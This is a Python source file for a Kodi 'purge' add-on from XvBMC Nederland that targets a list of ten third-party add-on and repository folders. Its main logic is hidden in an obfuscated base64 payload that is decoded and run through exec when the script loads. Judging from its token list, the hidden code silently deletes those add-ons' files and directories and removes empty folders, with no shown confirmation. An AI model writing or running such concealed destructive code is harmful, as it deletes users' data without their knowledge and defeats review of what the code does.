#!/usr/bin/python
 
"""
	IF you copy/paste 'script.purge' please keep the credits -2- EPiC -4- XvBMC-NL, Thx.
"""

#   script.Purge (Kodi Purge + Schoonmaak XvBMC Nederland)
#
#   Copyright (C) 2016
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


import xbmc,xbmcaddon,xbmcgui,xbmcplugin,os,re,base64,sys,xbmcvfs,shutil
# import os, xbmc, xbmcgui, shutil


#         ProgTitle ="XvBMC-NL-Maintenance"         #
HOME   = xbmc.translatePath('special://home/addons/')
dialog = xbmcgui.Dialog()
#         ProgTitle ="XvBMC-NL-Maintenance"         #


#######################################################################
#                          CLASSES
#######################################################################


class cacheEntry:
    def __init__(self, namei, pathi):
        self.name = namei
        self.path = pathi


#######################################################################
#						Work Functions
#######################################################################


def setupXvbmcEntries():
    entries = 10 #make sure this reflects the amount of entries you have
    dialogName = ["kidsplace", "NLVIEW", "nl-viewer", "nl-viewer2", "nlv3", "SportCenterHD", "SportsDevil", "Troma-copypaste", "NLviewRepo", "TVaddons.nl"]
    pathName = ["special://home/addons/plugin.video.kidsplace",
				"special://home/addons/plugin.video.NLVIEW",
				"special://home/addons/plugin.video.nl-viewer",
				"special://home/addons/plugin.video.nl-viewer2",
				"special://home/addons/plugin.video.nlv3",
				"special://home/addons/plugin.video.sportcenterhd",
				"special://home/addons/plugin.video.SportsDevil",
				"special://home/addons/plugin.video.troma",
				"special://home/addons/repository.NLVIEW",
				"special://home/addons/repository.tvaddons.nl"]
                    
    XvbmcEntries = []
    
    for x in range(entries):
        XvbmcEntries.append(cacheEntry(dialogName[x],pathName[x]))
    
    return XvbmcEntries


#######################################################################
#						CRAPCLEANER
#######################################################################


exec ((lambda OO000OO00O00OOOOO ,O000OOO00O0OOOOO0 :(lambda OOO000O00O0OOO0OO ,OOOO000O000000O0O ,O0OOOO00O000OOO0O :re .sub (OOO000O00O0OOO0OO ,OOOO000O000000O0O ,O0OOOO00O000OOO0O ))(r"([0-9a-f]+)",lambda OO00000OOO00OO0OO :OO000OO00O00OOOOO (OO00000OOO00OO0OO ,O000OOO00O0OOOOO0 ),base64 .b64decode ("NjMgNGUoKToKIyAgIDVlIDE2LDYsODEKIyAgIDQxIDU3ICAjCiMgICAyZCA9IDE2LjU4KDYuOCgxNi43MC4xOSgnMmU6Ly81Mi8zMi8nKSkpCiMgICAxYyA9IDYuOCgxNi43MC4xOSgnMmU6Ly81Mi8zMi8nKSkKIyAgIDExIDJhIDIxIDJkOgojICAgICAgIDQzICgnM2QuNTQuN2MnKSAyMSAyYToKIyAgICAgICAgICAgYyAyMygyZCkrMjMoMmEpCiMgICAgICAgICAgIDI0OgojICAgICAgICAgICAgICAgODEuMygxYysyYSwgN2Y9YikKIyAgICAgICAgICAgODQ6CiMgICAgICAgICAgICAgICAxNAojICAgICAgIDE4OgojICAgICAgICAgICAxNAoKCTFhID0gMjcoKQoKCTExIDQwIDIxIDFhOgoJCTMxID0gNi44KDQwLjcwKQoJCTQzIDE2LjcwLjViKDMxKT09YjoJCgkJCTExIDIwLCAyOSwgN2QgMjEgMTYuNTEoMzEpOgoJCQkJIzEwLjQ0KCIxMiA5IiwgJzgyIDJjIDMwIDc3IGUgNS4uLicsJzYwOicsIDMxKQoJCQkJYyAiNzggMWU6ICIrMzEKCQkJCSM2LjM3KDIzKDMxKSkKCQkJCSMxMyA9IDAKCQkJCSMxMyArPSAxNyg3ZCkKCQkJCTQzIDE3KDdkKSA+IDA6ICM0MyAxMyA+IDA6CgkJCQkJMTEgZiAyMSA3ZDoKCQkJCQkJMjQ6CgkJCQkJCQkxNi4zMygxNi43MC4xOSgyMCwgZikpCgkJCQkJCTg0OiAxNAoJCQkJCTExIGQgMjEgMjk6CgkJCQkJCTI0OgoJCQkJCQkJODEuMygxNi43MC4xOSgyMCwgZCkpCgkJCQkJCTg0IDFmOiAKCQkJCQkJCTgxLjMoMzEsIDdmPWIpCgkJCQkJCTE4OiAKCQkJCQkJCTgxLjMoMzEsIDdmPWIpCgkJCQkJCQkxNAoKCQkJCTE4OiAjNGEgMTcoMjkpID09IDAgNDggMTcoN2QpID09IDA6CgkJCQkJIzEwLjQ0KCIxMiA5IiwgJzZmIDJjIDMwIDNjIGUgNS4uLicsJzQ2OicsIDMxKQoJCQkJCWMgIjY3IDFlOiAiKzMxCgkJCQkJIzYuMzcoMjMoMzEpKQoJCQkJCTExIGYgMjEgN2Q6CgkJCQkJCTI0OgoJCQkJCQkJMTYuMzMoMTYuNzAuMTkoMjAsIGYpKQoJCQkJCQk4NDogMTQKCQkJCQkxMSBkIDIxIDI5OgoJCQkJCQkyNDoKCQkJCQkJCTgxLjMoMTYuNzAuMTkoMjAsIGQpKQoJCQkJCQk4NCAxZjogCgkJCQkJCQk4MS4zKDMxLCA3Zj1iKQoJCQkJCQkxODogCgkJCQkJCQk4MS4zKDMxLCA3Zj1iKQoJCQkJCQkJMTQKCgkJMTg6CgkJCSMxMC40NCgiMTIgOSIsICc4MyBlIDUgMmMhJywnNmMtM2IgMzY6JywgMzEpCgkJCWMgIjZjLTNiOiAiKzMxCgkJCSM2LjM3KDIzKDMxKSkKCgkJMjQ6CgkJCSMxMC40NCgiMTIgOSIsICc3OSA2ZiA3NiAzMCBlIDU/IDVmIDdlLi4uJywnNWQ6JywgMzEpCgkJCWMgIjY0IDFlICIrMzEKCQkJNi4zNygyMygzMSkpCgkJCTgxLjMoMzEsIDdmPWIpCgkJODQgMWY6IAoJCQk4MS4zKDMxLCA3Zj1iKQoJCTE4OiAKCQkJODEuMygzMSwgN2Y9YikKCQkJMTQKCgkxMC40NCgiLT0gN2EgNzQgPS0gIiwgJzc1IDVhIDcyIDIxIDZkIDQ5JywnJywgJyg0MiA3MiA3MSA2OCA3MSBhIDU2KScpCgk3KCkKCTYuMTUoIjI4IikKCTYuMTUoIjJiIikKCiIiIgoJNWYgNWMgNGIvM2EgJzM0LjQ1JyAzOSA0ZiAzNSAyZiAtMi0gNGQgLTQtIDEyLTczLCA2Mi4KIiIiCgo2MyA3KCk6CiMzZiAzNSA0YwoJYyIjIyMjIyMjIyMjIyA2NiA1MyA2OSA1OSAjIyMjIyMjIyMiCgk2YSA9IDAKCTIyID0gMAoJMTEgMjUsIDFkLCA3ZCAyMSAxNi41MSg2Yik6CgkJNDMgMTcoMWQpID09IDAgNDggMTcoN2QpID09IDA6ICMzZSAxMSAzYyAxYi4gMTcoN2QpID09IDAgN2IgODAgNTAKCQkJNmEgKz0gMSAjMjYgNmEKCQkJMTYuNjUoMjUpICM2MSAzNSA0NwoJCQljICIzOCA1NTogIisyNQoJCTRhIDE3KDFkKSA+IDAgNDggMTcoN2QpID4gMDogIzNlIDExIDZlIDFiCgkJCTIyICs9IDEgIzI2IAoKIiIiCgk1ZiA1YyA0Yi8zYSAnMzQuNDUnIDM5IDRmIDM1IDJmIC0yLSA0ZCAtNC0gMTItNzMsIDYyLgoiIiI=")))(lambda OOOOOOO00000000OO ,O0O00O0OOOO00O0OO :O0O00O0OOOO00O0OO [int ("0x"+OOOOOOO00000000OO .group (1 ),16 )],"0|1|2|rmtree|4|dependencies|xbmc|REMOVE_EMPTY_FOLDERS|translatePath|Nederland|a|True|print|d|orphaned|f|dialog|for|XvBMC|file_count|pass|executebuiltin|os|len|else|join|XvbmcEntries|directories|addonfolder|subdirs|ORPHANS|OSError|root|in|used_count|str|try|curdir|increment|setupXvbmcEntries|UpdateLocalAddons|dirs|item|UpdateAddonRepos|found|xvbmc|special|credits|some|xvbmcaddons|addons|unlink|script|the|Dependencies|log|successfully|please|paste|CHECK|empty|repository|check|initialize|entry|bruteforce|everything|if|ok|purge|CrapCLEAN|directory|and|condition|elif|copy|counters|EPiC|purgeOLD|keep|overkill|walk|home|Removing|tvaddons|removed|whistle|removal|listdir|Folders|system|exists|you|DELETE|import|IF|REMOVE|delete|Thx|def|MISSED|rmdir|Start|EMPTY|clean|Empty|empty_count|HOME|RE|good|used|we|path|as|is|NL|DONE|your|miss|old|OLD|Did|ALL|may|nl|files|SO|ignore_errors|be|shutil|We|No|except".split ("|")))

#######################################################################
#						do some VooDoo
#######################################################################

purgeOLD()
